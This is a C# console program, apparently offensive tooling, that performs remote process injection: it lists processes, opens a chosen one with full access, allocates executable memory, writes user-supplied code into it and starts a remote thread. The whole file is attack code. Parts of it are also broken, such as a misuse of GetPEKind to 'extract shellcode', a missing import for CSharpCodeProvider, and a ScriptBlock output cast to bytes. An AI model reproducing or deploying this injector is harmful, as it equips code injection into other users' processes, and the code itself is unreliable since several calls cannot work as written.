using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Management.Automation;

namespace ProcessInjection
{
    class Program
    {
        // Define the Win32 API functions
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // Define the constants
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            // Get the name of the process to inject from the command line argument
            // If no argument is given, use "notepad" as the default
            string processName = args.Length > 0 ? args[0] : "notepad";

            // List all the processes in the OS and their IDs
            Console.WriteLine("Processes in the OS:");
            foreach (Process p in Process.GetProcesses())
            {
                Console.WriteLine("{0} - {1}", p.ProcessName, p.Id);
            }

            // Ask the user to enter the ID of the process to inject
            Console.WriteLine("Enter the ID of the process to inject:");
            int processId = int.Parse(Console.ReadLine());

            // Get a handle to the target process
            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processId);

            // Ask the user to input the language (PowerShell or C#)
            Console.WriteLine("Enter the language to use (PowerShell or C#):");
            string language = Console.ReadLine().ToLower();

            byte[] shellcode = null;

            if (language == "powershell")
            {
                // Ask the user to input the PowerShell code
                Console.WriteLine("Enter the PowerShell code to inject:");
                string userCode = Console.ReadLine();

                // Convert the PowerShell code to a script block
                var scriptBlock = ScriptBlock.Create(userCode);

                // Invoke the script block and retrieve the output
                shellcode = scriptBlock.Invoke() as byte[];
            }
            else if (language == "c#")
            {
                // Ask the user to input the C# code
                Console.WriteLine("Enter the C# code to inject:");
                string userCode = Console.ReadLine();

                // Compile the user-input C# code to a DLL
                CompilerResults results;
                using (var provider = new CSharpCodeProvider())
                               {
                    var compilerParams = new CompilerParameters
                    {
                        GenerateInMemory = true,
                        GenerateExecutable = false
                    };
                    results = provider.CompileAssemblyFromSource(compilerParams, userCode);
                }

                if (results.Errors.HasErrors)
                {
                    Console.WriteLine("Compilation failed:");
                    foreach (CompilerError error in results.Errors)
                    {
                        Console.WriteLine("{0} - Line {1}: {2}", error.ErrorNumber, error.Line, error.ErrorText);
                    }
                    return;
                }

                // Load the compiled assembly and extract the shellcode
                using (MemoryStream ms = new MemoryStream())
                {
                    results.CompiledAssembly.GetModules()[0].GetPEKind(out _, out var _, out var _, out var _, out var _, out var _, out var _, out shellcode);
                }
            }
            else
            {
                Console.WriteLine("Invalid language. Please enter 'PowerShell' or 'C#'.");
                return;
            }

            // Allocate memory in the target process for the shellcode
            IntPtr pShellcode = VirtualAllocEx(hProcess,
                                               IntPtr.Zero,
                                               (uint)shellcode.Length,
                                               MEM_COMMIT | MEM_RESERVE,
                                               PAGE_EXECUTE_READWRITE);

            // Write the shellcode into the allocated memory
            UIntPtr bytesWritten;
            WriteProcessMemory(hProcess,
                               pShellcode,
                               shellcode,
                               (uint)shellcode.Length,
                               out bytesWritten);

            // Create a remote thread in the target process to execute the shellcode
            IntPtr hThread = CreateRemoteThread(hProcess,
                                                IntPtr.Zero,
                                                0,
                                                pShellcode,
                                                IntPtr.Zero,
                                                0,
                                                IntPtr.Zero);

            // Wait for the thread to finish
            WaitForSingleObject(hThread, 0xFFFFFFFF);

            // Close the handles
            CloseHandle(hThread);
            CloseHandle(hProcess);
        }
    }
}
